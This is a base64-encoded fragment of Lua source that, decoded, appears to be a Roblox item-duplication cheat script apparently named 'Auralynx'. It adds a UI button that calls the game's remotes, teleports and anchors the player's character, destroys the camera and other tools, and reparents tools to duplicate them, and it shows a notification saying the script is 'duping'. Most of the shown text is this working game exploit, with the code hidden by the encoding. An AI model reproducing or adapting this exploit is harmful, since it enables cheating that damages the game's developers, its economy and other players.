XJzdENoaWxkKCJIdW1hbm9pZFJvb3RQYXJ0IikKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBnYW1lLlBsYXllcnMuTG9jYWxQbGF5ZXIuQ2hhcmFjdGVyLkh1bWFub2lkUm9vdFBhcnQuQ0ZyYW1lID0gb2xkY2YKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBmb3Igeix4IGluIHBhaXJzKGdhbWUuUGxheWVycy5Mb2NhbFBsYXllci5CYWNrcGFjazpHZXRDaGlsZHJlbigpKSBkbwogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYgeC5OYW1lID09IHRvb2xzZWxjdGVkIHRoZW4KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgdG9vbGFtb3V0aCA9IHoKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHdhaXQoKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGR1cGluZyA9IGZhbHNlCiAgIHdhaXQoMSkKCgpsb2NhbCBHcmlwUG9zVGFibGUgPSB7CiAgICAgICAgICAgICAgICAgICAgICBWZWN0b3IzLm5ldygwLCAzLCA2KSwKICAgICAgICAgICAgICAgICAgICAgIFZlY3RvcjMubmV3KDEsIDMsIDYpLAogICAgICAgICAgICAgICAgICAgICAgVmVjdG9yMy5uZXcoMiwgMywgNiksCiAgICAgICAgICAgICAgICAgICAgICBWZWN0b3IzLm5ldygzLCAzLCA2KSwKICAgICAgICAgICAgICAgICAgICAgIFZlY3RvcjMubmV3KDQsIDMsIDYpLAogICAgICAgICAgICAgICAgICAgICAgVmVjdG9yMy5uZXcoNSwgMywgNiksCiAgICAgICAgICAgICAgICAgICAgICBWZWN0b3IzLm5ldyg2LCAzLCA2KSwKICAgICAgICAgICAgICAgICAgICAgIFZlY3RvcjMubmV3KDAsIDMsIDE3KSwKICAgICAgICAgICAgICAgICAgICAgIFZlY3RvcjMubmV3KDEsIDMsIDE3KSwKICAgICAgICAgICAgICAgICAgICAgIFZlY3RvcjMubmV3KDIsIDMsIDE3KSwKICAgICAgICAgICAgICAgICAgICAgIFZlY3RvcjMubmV3KDMsIDMsIDE3KSwKICAgICAgICAgICAgICAgICAgICAgIFZlY3RvcjMubmV3KDQsIDMsIDE3KSwKICAgICAgICAgICAgICAgICAgICAgIFZlY3RvcjMubmV3KDUsIDMsIDE3KSwKICAgICAgICAgICAgICAgICAgICAgIFZlY3RvcjMubmV3KDYsIDMsIDE3KSwKICAgICAgICAgICAgICAgICAgICAgIFZlY3RvcjMubmV3KDAsIDMsIDMwKSwKICAgICAgICAgICAgICAgICAgICAgIFZlY3RvcjMubmV3KDEsIDMsIDMwKSwKICAgICAgICAgICAgICAgICAgICAgIFZlY3RvcjMubmV3KDIsIDMsIDMwKSwKICAgICAgICAgICAgICAgICAgICAgIFZlY3RvcjMubmV3KDMsIDMsIDMwKSwKICAgICAgICAgICAgICAgICAgICAgIFZlY3RvcjMubmV3KDQsIDMsIDMwKSwKICAgICAgICAgICAgICAgICAgICAgIFZlY3RvcjMubmV3KDUsIDMsIDMwKSwKICAgICAgICAgICAgICAgICAgICAgIFZlY3RvcjMubmV3KDYsIDMsIDMwKSwKICAgICAgICAgICAgICAgICAgICAgIFZlY3RvcjMubmV3KDAsIDMsIDQzKSwKICAgICAgICAgICAgICAgICAgICAgIFZlY3RvcjMubmV3KDEsIDMsIDQzKSwKICAgICAgICAgICAgICAgICAgICAgIFZlY3RvcjMubmV3KDIsIDMsIDQzKSwKICAgICAgICAgICAgICAgICAgICAgIFZlY3RvcjMubmV3KDMsIDMsIDQzKSwKICAgICAgICAgICAgICAgICAgICAgIFZlY3RvcjMubmV3KDQsIDMsIDQzKSwKICAgICAgICAgICAgICAgICAgICAgIFZlY3RvcjMubmV3KDUsIDMsIDQzKSwKICAgICAgICAgICAgICAgICAgICAgIFZlY3RvcjMubmV3KDYsIDMsIDQzKSwKICAgICAgICAgICAgICAgICAgICAgIFZlY3RvcjMubmV3KDAsIDMsIDU1KSwKICAgICAgICAgICAgICAgICAgICAgIFZlY3RvcjMubmV3KDEsIDMsIDU1KSwKICAgICAgICAgICAgICAgICAgICAgIFZlY3RvcjMubmV3KDIsIDMsIDU1KSwKICAgICAgICAgICAgICAgICAgICAgIFZlY3RvcjMubmV3KDMsIDMsIDU1KSwKICAgICAgICAgICAgICAgICAgICAgIFZlY3RvcjMubmV3KDQsIDMsIDU1KSwKICAgICAgICAgICAgICAgICAgICAgIFZlY3RvcjMubmV3KDUsIDMsIDU1KSwKICAgICAgICAgICAgICAgICAgICAgIFZlY3RvcjMubmV3KDYsIDMsIDU1KSwKICAgICAgICAgICAgICAgICAgICAgIFZlY3RvcjMubmV3KC0xICwgMywgNiksCiAgICAgICAgICAgICAgICAgICAgICBWZWN0b3IzLm5ldygtMiAsIDMsIDYpLAogICAgICAgICAgICAgICAgICAgICAgVmVjdG9yMy5uZXcoLTMgLCAzLCA2KSwKICAgICAgICAgICAgICAgICAgICAgIFZlY3RvcjMubmV3KC00ICwgMywgNiksCiAgICAgICAgICAgICAgICAgICAgICBWZWN0b3IzLm5ldygtNSAsIDMsIDYpLAogICAgICAgICAgICAgICAgICAgICAgVmVjdG9yMy5uZXcoLTYgLCAzLCA2KSwKICAgICAgICAgICAgICAgICAgICAgIFZlY3RvcjMubmV3KC03ICwgMywgNiksCiAgICAgICAgICAgICAgICAgICAgICBWZWN0b3IzLm5ldygtOCAsIDMsIDYpLAogICAgICAgICAgICAgICAgICAgICAgVmVjdG9yMy5uZXcoLTkgLCAzLCA2KSwKICAgICAgICAgICAgICAgICAgICAgIFZlY3RvcjMubmV3KC0xMCAsIDMsIDYpLAogICAgICAgICAgICAgICAgICAgICAgVmVjdG9yMy5uZXcoLTExICwgMywgNiksCiAgICAgICAgICAgICAgICAgICAgICBWZWN0b3IzLm5ldygtMTIgLCAzLCA2KSwKICAgICAgICAgICAgICAgICAgICAgIFZlY3RvcjMubmV3KC0xMyAsIDMsIDYpLAogICAgICAgICAgICAgICAgICAgICAgVmVjdG9yMy5uZXcoLTE0ICwgMywgNiksCiAgICAgICAgICAgICAgICAgICAgICBWZWN0b3IzLm5ldygtMTUgLCAzLCA2KSwKICAgICAgICAgICAgICAgICAgICAgIFZlY3RvcjMubmV3KC0xNiAsIDMsIDYpLAogICAgICAgICAgICAgICAgICAgICAgVmVjdG9yMy5uZXcoLTE3ICwgMywgNiksCiAgICAgICAgICAgICAgICAgICAgICBWZWN0b3IzLm5ldygtMTggLCAzLCA2KSwKICAgICAgICAgICAgICAgICAgICAgIFZlY3RvcjMubmV3KC0xOSAsIDMsIDYpLAogICAgICAgICAgICAgICAgICAgICAgVmVjdG9yMy5uZXcoLTIwICwgMywgNiksCiAgICAgICAgICAgICAgICAgICAgICBWZWN0b3IzLm5ldygtMjEgLCAzLCA2KSwKICAgICAgICAgICAgICAgICAgICAgIFZlY3RvcjMubmV3KDEgLCAzLCA1NSksCiAgICAgICAgICAgICAgICAgICAgICBWZWN0b3IzLm5ldygyICwgMywgNTUpLAogICAgICAgICAgICAgICAgICAgICAgVmVjdG9yMy5uZXcoMyAsIDMsIDU1KSwKICAgICAgICAgICAgICAgICAgICAgIFZlY3RvcjMubmV3KDQgLCAzLCA1NSksCiAgICAgICAgICAgICAgICAgICAgICBWZWN0b3IzLm5ldyg1ICwgMywgNTUpLAogICAgICAgICAgICAgICAgICAgICAgVmVjdG9yMy5uZXcoNiAsIDMsIDU1KSwKICAgICAgICAgICAgICAgICAgICAgIFZlY3RvcjMubmV3KDcgLCAzLCA1NSksCiAgICAgICAgICAgICAgICAgICAgICBWZWN0b3IzLm5ldyg4ICwgMywgNTUpLAogICAgICAgICAgICAgICAgICAgICAgVmVjdG9yMy5uZXcoOSAsIDMsIDU1KSwKICAgICAgICAgICAgICAgICAgICAgIFZlY3RvcjMubmV3KDEwICwgMywgNTUpLAogICAgICAgICAgICAgICAgICAgICAgVmVjdG9yMy5uZXcoMTEgLCAzLCA1NSksCiAgICAgICAgICAgICAgICAgICAgICBWZWN0b3IzLm5ldygxMiAsIDMsIDU1KSwKICAgICAgICAgICAgICAgICAgICAgIFZlY3RvcjMubmV3KDEzICwgMywgNTUpLAogICAgICAgICAgICAgICAgICAgICAgVmVjdG9yMy5uZXcoMTQgLCAzLCA1NSksCiAgICAgICAgICAgICAgICAgICAgICBWZWN0b3IzLm5ldygxNSAsIDMsIDU1KSwKICAgICAgICAgICAgICAgICAgICAgIFZlY3RvcjMubmV3KDE2ICwgMywgNTUpLAogICAgICAgICAgICAgICAgICAgICAgVmVjdG9yMy5uZXcoMTcgLCAzLCA1NSksCiAgICAgICAgICAgICAgICAgICAgICBWZWN0b3IzLm5ldygxOCAsIDMsIDU1KSwKICAgICAgICAgICAgICAgICAgICAgIFZlY3RvcjMubmV3KDE5ICwgMywgNTUpLAogICAgICAgICAgICAgICAgICAgICAgVmVjdG9yMy5uZXcoMjAgLCAzLCA1NSksCiAgICAgICAgICAgICAgICAgICAgICBWZWN0b3IzLm5ldygyMSAsIDMsIDU1KSwKICAgICAgICAgICAgICAgICAgICAgIFZlY3RvcjMubmV3KDIyICwgMywgNTUpLAogICAgICAgICAgICAgICAgICAgICAgVmVjdG9yMy5uZXcoLTE2LCAzLCA0MyksCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgVmVjdG9yMy5uZXcoLTE3LCAzLCA0MyksCiAgICAgICAgICAgICAgICAgICAgICBWZWN0b3IzLm5ldygtMTgsIDMsIDQzKSwKICAgICAgICAgICAgICAgICAgICAgIFZlY3RvcjMubmV3KC0xOSwgMywgNDMpLAogICAgICAgICAgICAgICAgICAgICAgVmVjdG9yMy5uZXcoLTIwLCAzLCA0MyksCiAgICAgICAgICAgICAgICAgICAgICBWZWN0b3IzLm5ldygtMjEsIDMsIDQzKSwKICAgICAgICAgICAgICAgICAgICAgIFZlY3RvcjMubmV3KC0xNiwgMywgNDMpLAogICAgICAgICAgICAgICAgICAgICAgVmVjdG9yMy5uZXcoLTE1LCAzLCA0MyksCiAgICAgICAgICAgICAgICAgICAgICBWZWN0b3IzLm5ldygtMTYsIDMsIDQzKSwKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgVmVjdG9yMy5uZXcoLTE3LCAzLCA1NSksCiAgICAgICAgICAgICAgICAgICAgICBWZWN0b3IzLm5ldygtMTgsIDMsIDU1KSwKICAgICAgICAgICAgICAgICAgICAgIFZlY3RvcjMubmV3KC0xOSwgMywgNTUpLAogICAgICAgICAgICAgICAgICAgICAgVmVjdG9yMy5uZXcoLTIwLCAzLCA1NSksCiAgICAgICAgICAgICAgICAgICAgICBWZWN0b3IzLm5ldygtMjEsIDMsIDU1KSwKICAgICAgICAgICAgICAgICAgICAgIFZlY3RvcjMubmV3KC0xNiwgMywgNTUpLAogICAgICAgICAgICAgICAgICAgICAgVmVjdG9yMy5uZXcoLTE1LCAzLCA1NSksCiAgICAgICAgICAgICAgICAgICAgICBWZWN0b3IzLm5ldygwLCAzLCA1NSksCiAgICAgICAgICAgICAgICAgICAgICBWZWN0b3IzLm5ldygxLCAzLCA1NSksCiAgICAgICAgICAgICAgICAgICAgICBWZWN0b3IzLm5ldygyLCAzLCA1NSksCiAgICAgICAgICAgICAgICAgICAgICBWZWN0b3IzLm5ldygzLCAzLCA1NSksCiAgICAgICAgICAgICAgICAgICAgICBWZWN0b3IzLm5ldyg0LCAzLCA1NSksCiAgICAgICAgICAgICAgICAgICAgICBWZWN0b3IzLm5ldyg1LCAzLCA1NSksCiAgICAgICAgICAgICAgICAgICAgICBWZWN0b3IzLm5ldyg2LCAzLCA1NSksCiAgICAgICAgIFZlY3RvcjMubmV3KDIzICwgMywgNTUpLAogICAgICAgICBWZWN0b3IzLm5ldygyNCAsIDMsIDU1KSwKICAgICAgICAgIFZlY3RvcjMubmV3KDI1ICwgMywgNTUpLAogICAgICAgICAgIFZlY3RvcjMubmV3KDI2ICwgMywgNTUpLAogICAgICAgICAgICBWZWN0b3IzLm5ldygyNyAsIDMsIDU1KSwKICAgICAgICAgICAgICAgICAgICAgICAgIFZlY3RvcjMubmV3KC0xICwgMywgMzApLAogICAgICAgICAgICAgICAgICAgICAgVmVjdG9yMy5uZXcoLTIgLCAzLCAzMCksCiAgICAgICAgICAgICAgICAgICAgICBWZWN0b3IzLm5ldygtMyAsIDMsIDMwKSwKICAgICAgICAgICAgICAgICAgICAgIFZlY3RvcjMubmV3KC00ICwgMywgMzApLAogICAgICAgICAgICAgICAgICAgICAgVmVjdG9yMy5uZXcoLTUgLCAzLCAzMCksCiAgICAgICAgICAgICAgICAgICAgICBWZWN0b3IzLm5ldygtNiAsIDMsIDMwKSwKICAgICAgICAgICAgICAgICAgICAgIFZlY3RvcjMubmV3KC03ICwgMywgMzApLAogICAgICAgICAgICAgICAgICAgICAgVmVjdG9yMy5uZXcoLTggLCAzLCAzMCksCiAgICAgICAgICAgICAgICAgICAgICBWZWN0b3IzLm5ldygtOSAsIDMsIDMwKSwKICAgICAgICAgICAgICAgICAgICAgIFZlY3RvcjMubmV3KC0xMCAsIDMsIDMwKSwKICAgICAgICAgICAgICAgICAgICAgIFZlY3RvcjMubmV3KC0xMSAsIDMsIDMwKSwKICAgICAgICAgICAgICAgICAgICAgIFZlY3RvcjMubmV3KC0xMiAsIDMsIDMwKSwKICAgICAgICAgICAgICAgICAgICAgIFZlY3RvcjMubmV3KC0xMyAsIDMsIDMwKSwKICAgICAgICAgICAgICAgICAgICAgIFZlY3RvcjMubmV3KC0xNCAsIDMsIDMwKSwKICAgICAgICAgICAgICAgICAgICAgIFZlY3RvcjMubmV3KC0xNSAsIDMsIDMwKSwKICAgICAgICAgICAgICAgICAgICAgIFZlY3RvcjMubmV3KC0xNiAsIDMsIDMwKSwKICAgICAgICAgICAgICAgICAgICAgIFZlY3RvcjMubmV3KC0xNyAsIDMsIDMwKSwKICAgICAgICAgICAgICAgICAgICAgIFZlY3RvcjMubmV3KC0xOCAsIDMsIDMwKSwKICAgICAgICAgICAgICAgICAgICAgIFZlY3RvcjMubmV3KC0xOSAsIDMsIDMwKSwKICAgICAgICAgICAgICAgICAgICAgIFZlY3RvcjMubmV3KC0yMCAsIDMsIDMwKSwKICAgICAgICAgICAgICAgICAgICAgIFZlY3RvcjMubmV3KC0yMSAsIDMsIDMwKSwKICAgICAgICAgICAgICAgICAgICAgICAgICBWZWN0b3IzLm5ldygxICwgMywgMzApLAogICAgICAgICAgICAgICAgICAgICAgVmVjdG9yMy5uZXcoMiAsIDMsIDMwKSwKICAgICAgICAgICAgICAgICAgICAgIFZlY3RvcjMubmV3KDMgLCAzLCAzMCksCiAgICAgICAgICAgICAgICAgICAgICBWZWN0b3IzLm5ldyg0ICwgMywgMzApLAogICAgICAgICAgICAgICAgICAgICAgVmVjdG9yMy5uZXcoNSAsIDMsIDMwKSwKICAgICAgICAgICAgICAgICAgICAgIFZlY3RvcjMubmV3KDYgLCAzLCAzMCksCiAgICAgICAgICAgICAgICAgICAgICBWZWN0b3IzLm5ldyg3ICwgMywgMzApLAogICAgICAgICAgICAgICAgICAgICAgVmVjdG9yMy5uZXcoOCAsIDMsIDMwKSwKICAgICAgICAgICAgICAgICAgICAgIFZlY3RvcjMubmV3KDkgLCAzLCAzMCksCiAgICAgICAgICAgICAgICAgICAgICBWZWN0b3IzLm5ldygxMCAsIDMsIDMwKSwKICAgICAgICAgICAgICAgICAgICAgIFZlY3RvcjMubmV3KDExICwgMywgMzApLAogICAgICAgICAgICAgICAgICAgICAgVmVjdG9yMy5uZXcoMTIgLCAzLCAzMCksCiAgICAgICAgICAgICAgICAgICAgICBWZWN0b3IzLm5ldygxMyAsIDMsIDMwKSwKICAgICAgICAgICAgICAgICAgICAgIFZlY3RvcjMubmV3KDE0ICwgMywgMzApLAogICAgICAgICAgICAgICAgICAgICAgVmVjdG9yMy5uZXcoMTUgLCAzLCAzMCksCiAgICAgICAgICAgICAgICAgICAgICBWZWN0b3IzLm5ldygxNiAsIDMsIDMwKSwKICAgICAgICAgICAgICAgICAgICAgIFZlY3RvcjMubmV3KDE3ICwgMywgMzApLAogICAgICAgICAgICAgICAgICAgICAgVmVjdG9yMy5uZXcoMTggLCAzLCAzMCksCiAgICAgICAgICAgICAgICAgICAgICBWZWN0b3IzLm5ldygxOSAsIDMsIDMwKSwKICAgICAgICAgICAgICAgICAgICAgIFZlY3RvcjMubmV3KDIwICwgMywgMzApLAogICAgICAgICAgICAgICAgICAgICAgVmVjdG9yMy5uZXcoMjEgLCAzLCAzMCksCiAgICAgICAgICAgICAgICAgICAgICBWZWN0b3IzLm5ldygyMiAsIDMsIDMwKSwKICAgICAgICAgICAgICAgICAgICAgIFZlY3RvcjMubmV3KDIzICwgMywgMzApLAogICAgICAgICAgICAgICAgICAgICAgVmVjdG9yMy5uZXcoMjQgLCAzLCAzMCksCiAgICAgICAgICAgICAgICAgICAgICBWZWN0b3IzLm5ldygyNSAsIDMsIDMwKSwKICAgICAgICAgICAgICAgICAgICAgIFZlY3RvcjMubmV3KDI2ICwgMywgMzApLAogICAgICAgICAgICAgICAgICAgICAgVmVjdG9yMy5uZXcoMjcgLCAzLCAzMCksCiAgICAgICAgICAgICAgICAgICAgICBWZWN0b3IzLm5ldygyOCAsIDMsIDMwKSwKICAgICAgICAgICAgICAgICAgICAgIFZlY3RvcjMubmV3KDI4LCAzLCA2KSwKICAgICAgICAgICAgICAgICAgICAgIFZlY3RvcjMubmV3KDI3LCAzLCA2KSwKICAgICAgICAgICAgICAgICAgICAgIFZlY3RvcjMubmV3KDI2LCAzLCA2KSwKICAgICAgICAgICAgICAgICAgICAgIFZlY3RvcjMubmV3KDI1LCAzLCA2KSwKICAgICAgICAgICAgICAgICAgICAgIFZlY3RvcjMubmV3KDI0LCAzLCA2KSwKICAgICAgICAgICAgICAgICAgICAgIFZlY3RvcjMubmV3KDIzLCAzLCA2KSwKICAgICAgICAgICAgICAgICAgICAgIFZlY3RvcjMubmV3KDIyLCAzLCA2KSwKICAgICAgICAgICAgICAgICAgICAgIFZlY3RvcjMubmV3KDIxLCAzLCA2KSwKICAgICAgICAgICAgICAgICAgICAgIFZlY3RvcjMubmV3KDIxLCAzLCAxNyksCiAgICAgICAgICAgICAgICAgICAgICBWZWN0b3IzLm5ldygyMiwgMywgMTcpLAogICAgICAgICAgICAgICAgICAgICAgVmVjdG9yMy5uZXcoMjMsIDMsIDE3KSwKICAgICAgICAgICAgICAgICAgICAgIFZlY3RvcjMubmV3KDI0LCAzLCAxNyksCiAgICAgICAgICAgICAgICAgICAgICBWZWN0b3IzLm5ldygyNSwgMywgMTcpLAogICAgICAgICAgICAgICAgICAgICAgVmVjdG9yMy5uZXcoMjYsIDMsIDE3KSwKICAgICAgICAgICAgICAgICAgICAgIFZlY3RvcjMubmV3KDI3LCAzLCAxNyksCiAgICAgICAgICAgICAgICAgICAgICBWZWN0b3IzLm5ldygyOCwgMywgMTcpLAogICAgICAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgICAgICAgIGZvciBpLCB0b29sIGluIHBhaXJzKGdhbWUuUGxheWVycy5Mb2NhbFBsYXllci5CYWNrcGFjazpHZXRDaGlsZHJlbigpKSBkbwogICAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZiB0b29sOklzQSgiVG9vbCIpIHRoZW4KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIC0tIE1vdmUgdGhlIHRvb2wgdG8gdGhlIHBsYXllciBjaGFyYWN0ZXIKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHRvb2wuUGFyZW50ID0gZ2FtZS5QbGF5ZXJzLkxvY2FsUGxheWVyLkNoYXJhY3RlcgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAtLSBTZXR0aW5nIHRoZSBncmlwIHBvc2l0aW9uIGluZGV4CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBsb2NhbCBncmlwUG9zSW5kZXggPSBtYXRoLm1pbihpLCAjR3JpcFBvc1RhYmxlKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgbG9jYWwgZ3JpcFBvcyA9IEdyaXBQb3NUYWJsZVtncmlwUG9zSW5kZXhdCiAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAtLSBTZXQgdGhlIGdyaXAgcG9zaXRpb24gKEdyaXBQb3MpIGlmIHRoZSB0b29sIGlzIGluIHRoZSBwbGF5ZXIncyBjaGFyYWN0ZXIKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmIHRvb2w6SXNEZXNjZW5kYW50T2YoZ2FtZS5QbGF5ZXJzLkxvY2FsUGxheWVyLkNoYXJhY3RlcikgdGhlbgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHRvb2wuR3JpcFBvcyA9IGdyaXBQb3MKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGVsc2UKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB3YXJuKCJUb29sIiwgdG9vbC5OYW1lLCAiaXMgbm90IGluIGNoYXJhY3RlciIpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgICAgICAgICAgICAgICAgZW5kCiAgICBlbmQKfSkKCi0tIEJ1dHRvbiBmb3IgR2lhbnQgSm91c3QgUmVkIENyb3NzClRvb2xzVGFiOkFkZEJ1dHRvbih7CiAgICBOYW1lID0gIkdpYW50IEpvdXN0IFJlZCBDcm9zcyIsCiAgICBDYWxsYmFjayA9IGZ1bmN0aW9uKCkKICAgICAgICB0b29sc2VsY3RlZCA9ICJKb3VzdFJlZCIKICAgICAgICBkdXBlYW1vdCA9IDE3NSAtLVB1dCBhbW91dGggdG8gZHVwZQogICAgICAgIHBpY2t0b29scmVtb3RlID0gZ2FtZTpHZXRTZXJ2aWNlKCJSZXBsaWNhdGVkU3RvcmFnZSIpLlJFOkZpbmRGaXJzdENoaWxkKCIxVG9vMWwiKQogICAgICAgIGNsZWFydG9vbHJlbW90ZSA9IGdhbWU6R2V0U2VydmljZSgiUmVwbGljYXRlZFN0b3JhZ2UiKS5SRTpGaW5kRmlyc3RDaGlsZCgiMUNsZWExclRvb2wxcyIpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZHVwaW5nID0gdHJ1ZQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIG9sZGNmID0gZ2FtZS5QbGF5ZXJzLkxvY2FsUGxheWVyLkNoYXJhY3Rlci5IdW1hbm9pZFJvb3RQYXJ0LkNGcmFtZQpnYW1lOkdldFNlcnZpY2UoIlN0YXJ0ZXJHdWkiKTpTZXRDb3JlKCJTZW5kTm90aWZpY2F0aW9uIix7VGl0bGU9IkF1cmFseW54IGlzIGR1cGluZy4uLiIsVGV4dD0iUGxlYXNlIGRvIG5vdCBlcXVpcCBhbnkgdG9vbHMgb3IgdW5lcXVpcCB0b29scyBvciBjbGljayB0b29scyBvbiBpbnZlbnRvcnkuIEl0IHdpbGwgYnJlYWsgdGhlIHNjcmlwdC4iLCBCdXR0b24xID0gIk9rIiAsRHVyYXRpb249NX0pCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYgZ2FtZS5QbGF5ZXJzLkxvY2FsUGxheWVyLkNoYXJhY3Rlci5IdW1hbm9pZC5TaXQgPT0gdHJ1ZSB0aGVuCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB0YXNrLndhaXQoKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZ2FtZS5QbGF5ZXJzLkxvY2FsUGxheWVyLkNoYXJhY3Rlci5IdW1hbm9pZC5TaXQgPSBmYWxzZQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHdhaXQoMC4xKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmIGdhbWU6R2V0U2VydmljZSgiV29ya3NwYWNlIik6RmluZEZpcnN0Q2hpbGQoIkNhbWVyYSIpIHRoZW4KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGdhbWU6R2V0U2VydmljZSgiV29ya3NwYWNlIik6RmluZEZpcnN0Q2hpbGQoIkNhbWVyYSIpOkRlc3Ryb3koKSBlbmQKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGZvciBtPTEsMiBkbyB0YXNrLndhaXQoKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBnYW1lLlBsYXllcnMuTG9jYWxQbGF5ZXIuQ2hhcmFjdGVyLkh1bWFub2lkUm9vdFBhcnQuQ0ZyYW1lID0gQ0ZyYW1lLm5ldyg5OTk5OTk5OTkuNDE0LCAtNDkwLCA5OTk5OTk5OTkuNDE0LCAwLjk3NDM2MDQwNiwgLTAuMTc1NzM0MDg4LCAwLjE0MDQ5NzYxLCAtMC4xMzM0NDE0MDQsIDAuMDUxNDA1MzA2OSwgMC45ODk3MjI3MjksIC0wLjE4MTE1MDMwMiwgLTAuOTgzMDk0NjkyLCAwLjAyNjYzNzA5MjIpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB0YXNrLndhaXQoMC4yKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBnYW1lLlBsYXllcnMuTG9jYWxQbGF5ZXIuQ2hhcmFjdGVyLkh1bWFub2lkUm9vdFBhcnQuQW5jaG9yZWQgPSB0cnVlCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgd2FpdCgwLjUpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZm9yIGFpZGosYWZoIGluIHBhaXJzKGdhbWU6R2V0U2VydmljZSgiUGxheWVycyIpLkxvY2FsUGxheWVyLkNoYXJhY3RlcjpHZXRDaGlsZHJlbigpKSBkbwogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYgYWZoLk5hbWUgPT0gdG9vbHNlbGN0ZWQgPT0gZmFsc2UgdGhlbgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZiBhZmg6SXNBKCJUb29sIikgdGhlbgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGFmaC5QYXJlbnQgPSBnYW1lLlBsYXllcnMuTG9jYWxQbGF5ZXIuQmFja3BhY2sKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBmb3IgYWllZmhpZXdod2YsZHZqYnZqIGluIHBhaXJzKGdhbWU6R2V0U2VydmljZSgiUGxheWVycyIpLkxvY2FsUGxheWVyLkJhY2twYWNrOkdldENoaWxkcmVuKCkpIGRvCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZiBkdmpidmo6SXNBKCJUb29sIikgdGhlbgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZiBkdmpidmouTmFtZSA9PSB0b29sc2VsY3RlZCA9PSBmYWxzZSB0aGVuCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZHZqYnZqOkRlc3Ryb3koKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGZvciB0dGp0anV0anV0amp0aixkZHZkdmRzdmRmYnJueXR5dG12ZHYgaW4gcGFpcnMoZ2FtZTpHZXRTZXJ2aWNlKCJQbGF5ZXJzIikuTG9jYWxQbGF5ZXIuQ2hhcmFjdGVyOkdldENoaWxkcmVuKCkpIGRvCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZiBkZHZkdmRzdmRmYnJueXR5dG12ZHY6SXNBKCJUb29sIikgdGhlbgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZiBkZHZkdmRzdmRmYnJueXR5dG12ZHYubmFtZSA9PSB0b29sc2VsY3RlZCA9PSBmYWxzZSB0aGVuCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZGR2ZHZkc3ZkZmJybnl0eXRtdmR2OkRlc3Ryb3koKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICAg